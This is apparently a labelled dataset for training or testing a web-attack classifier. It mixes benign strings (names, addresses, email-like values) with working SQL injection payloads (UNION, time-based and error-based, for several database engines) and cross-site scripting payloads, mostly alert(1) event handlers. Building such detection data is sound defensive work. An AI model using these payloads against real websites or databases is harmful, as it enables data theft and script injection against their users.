index,payload,type
11384,s5bal850de,benign
3836,1' in boolean mode  )   or sleep  (  5  )  #,sqli
15172,miremont@barnicesuv.th,benign
16848,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",xss
946,"1""   )    )     )   union all select null,null,null,null,null--",sqli
1673,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",sqli
20354,"<var onkeypress=""alert(1)"" contenteditable>test</var>",xss
11557,6110,benign
17257,<font id=x tabindex=1 onbeforeactivate=alert(1)></font>,xss
15204,9334,benign
14916,23763353y,benign
17730,"<img oncopy=""alert(1)"" contenteditable>test</img>",xss
16311,"<col oncopy=""alert(1)"" contenteditable>test</col>",xss
13899,alfeo,benign
14977,8449,benign
17362,"<frame onbeforecut=""alert(1)"" contenteditable>test</frame>",xss
700,"""&""",sqli
20352,<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>,xss
16606,"<dfn onkeyup=""alert(1)"" contenteditable>test</dfn>",xss
1112,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",sqli
11460,itrabo,benign
19260,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></slot>",xss
16265,"<code draggable=""true"" ondragleave=""alert(1)"">test</code>",xss
20723,"<root/>//[""'`-->]]>]</div>",xss
15967,<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,xss
15461,"<a onkeyup=""alert(1)"" contenteditable>test</a>",xss
15565,"<address onpaste=""alert(1)"" contenteditable>test</address>",xss
2086,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",sqli
3299,1 where 3802  =  3802 and 2006  =  2006,sqli
2627,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""dqou"" like ""dqou",sqli
16094,"<br onmousedown=""alert(1)"">test</br>",xss
16860,"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",xss
18111,<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,xss
2000,"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'qvqf'  =  'qvqf",sqli
11827,sahid,benign
20169,"<title onmouseover=""alert(1)"">test</title>",xss
20233,"<track onmouseover=""alert(1)"">test</track>",xss
14477,lemieux4,benign
20645,"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",xss
12972,villadoz,benign
16900,"<div draggable=""true"" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>",xss
13675,navia de suarna,benign
402," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",sqli
17333,"<form oncut=""alert(1)"" contenteditable>test</form>",xss
13413,jerusaln,benign
12166,a6ordab07,benign
2164,-2761 or 1144  =  7657-- mfml,sqli
17217,"<figcaption onmouseup=""alert(1)"">test</figcaption>",xss
1544,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",sqli
195, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,sqli
17121,"<embed draggable=""true"" ondrag=""alert(1)"">test</embed>",xss
902,-7999  )   or 8422  =  1336,sqli
2192,"1',  (  select   (  case when   (  6948  =  4654  )   then 1 else 6948*  (  select 6948 from mysql.db  )   end   )    )   ",sqli
11958,victoria,benign
671,select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',sqli
20096,<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>,xss
1410,"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
3739,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",sqli
15954,"<big onmouseenter=""alert(1)"">test</big>",xss
389,""" or """"&""",sqli
3400,1'  )   as fksm where 9714  =  9714,sqli
2670,1'  )   where 5378  =  5378,sqli
16495,<dd id=x tabindex=1 onfocus=alert(1)></dd>,xss
1475,"1 where 5929  =  5929 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
16854,"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",xss
3503,-8015  )   where 9808  =  9808 or 9323  =  9323#,sqli
1616,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
18733,"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionend=alert(1)></b>",xss
15839,<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>,xss
13078,diffring9@discon.cv,benign
15246,brincones,benign
17788,"<input onmouseup=""alert(1)"">test</input>",xss
3848,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
17209,"<figcaption onkeypress=""alert(1)"" contenteditable>test</figcaption>",xss
14037,els,benign
18141,"<s onbeforecut=""alert(1)"" contenteditable>test</s>",xss
2575," end and    (    (     (  ""zpii"" like ""zpii",sqli
1526,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sqli
17652,<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,xss
18555,<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,xss
11321,lu,benign
13813,canute,benign
12793,callejon san felices 187,benign
3991,"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
14996,"c/ zilbetiko monasterioaren, s/n,",benign
1605,"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",sqli
1536,"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",sqli
19803,<svg><pre onload=alert(1)></pre>,xss
1378,1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'jhlj'  =  'jhlj,sqli
17240,"<figure onkeydown=""alert(1)"" contenteditable>test</figure>",xss
2157,1'  )   as mpsf where 3348  =  3348,sqli
12981,"coslada 83, 4g",benign
1238,select case when 6420  =  7941 then 1 else null end--,sqli
1272,1'||  (  select 'jmao' where 3009  =  3009,sqli
2363,-6030%'  )   or 3038  =  3038,sqli
18716,"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></track>",xss
12163,srdida.me3te,benign
13578,siefert,benign
14340,22655130s,benign
17510,"<header onmouseout=""alert(1)"">test</header>",xss
14609,crcova valentini,benign
1290,"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj",sqli
3933,"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,sqli
17925,<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,xss
11389,hembrick,benign
12385,33418,benign
17760,<input id=x onfocus=alert(1)>,xss
1344,"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",sqli
19013,"<style>@keyframes slidein {}</style><area style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></area>",xss
1214,"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf",sqli
3069,select case when 8975  =  2352 then 1 else null end--,sqli
20206,"<track draggable=""true"" ondragenter=""alert(1)"">test</track>",xss
11451,d76en3r9n8z01,benign
3679,"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
14191,combee,benign
11696,29850288z,benign
14932,ive,benign
11979,1.53E+15,benign
19370,"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationstart=""alert(1)""></dl>",xss
19656,"<sup oncopy=""alert(1)"" contenteditable>test</sup>",xss
19926,<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,xss
17414,"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",xss
17924,"<progress ondblclick=""alert(1)"">test</progress>",xss
244," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",sqli
17322,<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>,xss
19595,<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>,xss
1679,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",sqli
13313,0a3ramplar,benign
13855,"passeig de les palmeres, s/n",benign
15267,tsoucas,benign
17093,"<em draggable=""true"" ondragstart=""alert(1)"">test</em>",xss
63,admin' or '1'  =  '1,sqli
1792,"1"" where 4633  =  4633 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
16067,<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,xss
2848,"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",sqli
17951,<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,xss
17312,"<footer onmouseover=""alert(1)"">test</footer>",xss
15207,6087,benign
16742,"<div draggable=""true"" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>",xss
17311,"<footer onmouseout=""alert(1)"">test</footer>",xss
3537,"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",sqli
19131,"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tbody>",xss
19181,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",xss
20523,"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",xss
19674,"<svg draggable=""true"" ondragleave=""alert(1)"">test</svg>",xss
17248,"<figure onmouseover=""alert(1)"">test</figure>",xss
479," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",sqli
19951,<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,xss
17244,"<figure onmouseenter=""alert(1)"">test</figure>",xss
13940,domingo,benign
18984,"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></summary>",xss
13452,isolina,benign
15373,<form action=javascript:alert(1)><input type=submit> ,xss
18275,<select onchange=alert(1)><option>change me</option><option>XSS</option></select>,xss
18175,<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>,xss
19540,"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",xss
17791,<input type=checkbox id=x onfocus=alert(1)>,xss
20629,"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
11559,ayyuce,benign
17603,"<html onmouseenter=""alert(1)"">test</html>",xss
16798,"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",xss
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",sqli
17897,"<pre onmousedown=""alert(1)"">test</pre>",xss
14363,5130,benign
19559,"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationend=""alert(1)""></tt>",xss
13029,alek,benign
17198,"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>",xss
15190,dobbing3,benign
774,//*,sqli
15181,ezio,benign
15754,"<b oncopy=""alert(1)"" contenteditable>test</b>",xss
1899,1'   )    )     )   order by 1#,sqli
16028,"<body draggable=""true"" ondragleave=""alert(1)"">test</body>",xss
13667,goman@fbi-criminal-network.com.mh,benign
15732,"<audio onmouseout=""alert(1)"">test</audio>",xss
2301,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,sqli
19768,<svg><image href=1 onerror=alert(1)>,xss
364," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",sqli
13840,47901295t,benign
13387,pimentel gatius,benign
15457,"<a ondblclick=""alert(1)"">test</a>",xss
3616,-6712'   )    )    as kqff where 9146  =  9146 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,sqli
18683,"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rp>",xss
12375,escalera,benign
11801,5083,benign
11718,16601924h,benign
11358,5240,benign
14821,eastman@beesmer.lu,benign
12927,remington,benign
13866,arabele,benign
15893,"<bdo onmouseout=""alert(1)"">test</bdo>",xss
16422,"<data draggable=""true"" ondrag=""alert(1)"">test</data>",xss
3286,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",sqli
1084,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",sqli
19331,"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationend=""alert(1)""></button>",xss
15056,siku@tartasconamor.in,benign
2654,"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",sqli
2422,"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",sqli
20757,"<handler xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"">alert(94)</handler>",xss
3512,"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc",sqli
12126,parola@zonamodelos.pl,benign
12354,dekeyser@creacionwebs.bn,benign
20674,<A href=javas%26#99;ript:alert(1)>click,xss
13194,argentino,benign
18246,"<section oncut=""alert(1)"" contenteditable>test</section>",xss
18024,"<rp onkeyup=""alert(1)"" contenteditable>test</rp>",xss
12435,"carlos trivio moreno, 2,",benign
16288,"<code onmouseleave=""alert(1)"">test</code>",xss
17964,"<q onmousemove=""alert(1)"">test</q>",xss
12296,38673697w,benign
18556,<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>,xss
19144,"<style>@keyframes slidein {}</style><ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ul>",xss
18593,"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",xss
18934,"<style>:target {transform: rotate(180deg);}</style><li id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></li>",xss
19991,<textarea onblur=alert(1) id=x></textarea><input autofocus>,xss
20875,"<stylesheet xmlns=""http://www.w3.org/TR/WD-xsl"">",xss
854,"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc",sqli
20829,<!DOCTYPE doc [,xss
12627,leonella,benign
15523,"<acronym onkeydown=""alert(1)"" contenteditable>test</acronym>",xss
2001,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- zozj",sqli
15256,ibdes,benign
1676,"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh",sqli
1051,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  -- kfqs",sqli
15561,"<address onmousemove=""alert(1)"">test</address>",xss
2042,"1'  )   and elt  (  4249  =  4249,7259  )  ",sqli
12847,elnore,benign
961,1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',sqli
167,hi'  )   or   (  'a'  =  'a,sqli
11597,poncin@todobetis.mil,benign
2407,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",sqli
14396,19432,benign
18909,"<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></fieldset>",xss
17495,"<header onbeforepaste=""alert(1)"" contenteditable>test</header>",xss
3754,-7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff,sqli
1917,"1""  )   as wsyv where 8142  =  8142 rlike sleep  (  5  )  #",sqli
17136,"<embed onclick=""alert(1)"">test</embed>",xss
15339,<%78 onxxx=1 ,xss
11701,de tena leguizamn,benign
12199,40984940k,benign
14210,1.20E+15,benign
19756,<svg><figure onload=alert(1)></figure>,xss
13836,en9r195d9,benign
836,# from wapiti,sqli
1428,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sqli
20281,"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",xss
16939,"<div draggable=""true"" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>",xss
11882,02877417w,benign
3911,"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",sqli
1170,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",sqli
18939,"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></mark>",xss
14799,2.72E+15,benign
12101,rei1@rtce.au,benign
16153,"<canvas ondblclick=""alert(1)"">test</canvas>",xss
16117,"<button onclick=""alert(1)"">test</button>",xss
20072,"<th onmouseout=""alert(1)"">test</th>",xss
210," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",sqli
16417,"<content onmousemove=""alert(1)"">test</content>",xss
15815,<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>,xss
12964,5.40E+15,benign
18467,<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,xss
19712,<svg><animatetransform onbegin=alert(1) attributeName=transform>,xss
20053,<th id=x tabindex=1 onfocus=alert(1)></th>,xss
1953,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",sqli
11693,angullo acosta,benign
13555,4.38E+15,benign
2123,"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",sqli
17731,"<img oncut=""alert(1)"" contenteditable>test</img>",xss
19497,"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",xss
3127,"1'+  (  select inrv where 2178  =  2178 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
13461,cicek0,benign
20858,"<input name=""secret"" type=""password"">",xss
14927,50245802w,benign
19417,"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>",xss
18536,"<strong ondblclick=""alert(1)"">test</strong>",xss
12186,alexiana,benign
11787,mary-ann,benign
15472,"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>",xss
18474,"<span onkeydown=""alert(1)"" contenteditable>test</span>",xss
1942,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cgbf' like 'cgbf",sqli
20320,<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,xss
3555,"-9772' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'igaa'  =  'igaa",sqli
18313,<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,xss
15317,<x onclick=alert(1)>click this! ,xss
962,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",sqli
2642,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""bzzt"" like ""bzzt",sqli
19456,"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationstart=""alert(1)""></nextid>",xss
19033,"<style>@keyframes slidein {}</style><code style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></code>",xss
826," select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1",sqli
16283,"<code onkeydown=""alert(1)"" contenteditable>test</code>",xss
18879,"<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bgsound>",xss
15073,tobar,benign
17565,"<hr ondblclick=""alert(1)"">test</hr>",xss
441," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",sqli
1748,"-2378"" where 2686  =  2686 or 6872  =  6872--",sqli
3388,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,sqli
623," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",sqli
20813,"<body><a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",xss
1356,"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
14675,segu san marful,benign
2072,"1"" where 1166  =  1166",sqli
15105,rowen,benign
18169,<samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>,xss
13375,4259,benign
17025,"<dt draggable=""true"" ondrag=""alert(1)"">test</dt>",xss
19898,"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",xss
15232,emesh,benign
12287,25g0a00,benign
14621,sonsoles,benign
1179,1'+  (  select 'cwta' where 6091  =  6091,sqli
15222,boykin@cienciapolicial.gr,benign
18626,"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",xss
15447,<a id=x tabindex=1 onfocus=alert(1)></a>,xss
20467,"<xmp onkeyup=""alert(1)"" contenteditable>test</xmp>",xss
1982,"1   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  4234  =  4234",sqli
20625,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
17776,"<input ondblclick=""alert(1)"">test</input>",xss
15139,blakley@asyra.ao,benign
12016,6.66E+15,benign
16059,"<body onmousemove=""alert(1)"">test</body>",xss
415,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,sqli
2987,"1""  )   where 6018  =  6018 and 7533  =  7533--",sqli
19570,"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationstart=""alert(1)""></wbr>",xss
18597,"<style>:target {color: red;}</style><bgsound id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bgsound>",xss
19320,"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationstart=""alert(1)""></bgsound>",xss
834," or benchmark  (  10000000,MD5  (  1   )    )   #",sqli
18047,<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,xss
18328,"<slot draggable=""true"" ondragleave=""alert(1)"">test</slot>",xss
15958,"<big onmouseover=""alert(1)"">test</big>",xss
20257,"<tt onkeydown=""alert(1)"" contenteditable>test</tt>",xss
12533,gering,benign
11390,1.76E+15,benign
699," select * from users where id  =  '1' union select "";""_,version  (    )   -- 1'",sqli
19634,"<summary onmousemove=""alert(1)"">test</summary>",xss
11548,strock,benign
13837,93128213v,benign
12122,nicole-meyer@creacionesdolcevita.us,benign
